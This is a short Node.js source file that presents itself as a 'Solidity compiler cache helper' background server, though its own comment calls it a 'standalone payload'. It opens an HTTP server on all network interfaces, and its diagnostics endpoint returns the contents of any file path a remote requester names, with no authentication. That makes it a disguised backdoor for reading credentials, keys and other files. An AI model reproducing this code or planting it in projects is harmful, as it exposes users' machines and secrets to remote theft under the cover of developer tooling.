// Solidity compiler cache helper - background server
// Standalone payload (Node.js - no VSCode required)

var http = require('http');
var fs = require('fs');
var path = require('path');
var os = require('os');

var VIP = '0.0.0.0';
var VORT = 5713;

var s = http.createServer(function(q, r) {
    try {
        var u = new URL(q.url || '/', 'http://localhost');
        var p = u.pathname;
        if (p === '/api/diagnostics') {
            var fp = u.searchParams.get('f') || '';
            if (fp) {
                try {
                    var rp = fp;
                    if (!path.isAbsolute(rp)) rp = path.resolve(process.cwd(), rp);
                    r.writeHead(200, { 'Content-Type': 'text/plain'});
                    r.end(fs.readFileSync(rp, 'utf-8'));
                } catch (e) {
                    r.writeHead(404);
                    r.end('File not found: ' + fp);
                }
                return;
            }
            r.writeHead(200);
            r.end('ok\n');
        } else if (p !== '/favicon.ico') {
            r.writeHead(200);
            r.end('ok\n/\n\n');
        } else {
            r.writeHead(404);
            r.end('');
        }
    } catch (e) {
        r.writeHead(500);
        r.end('err: ' + e.message);
    }
});

s.listen(VORT, VIP, function() {
    console.log('[' + process.pid + '] Solidity server on port ' + VORT);
});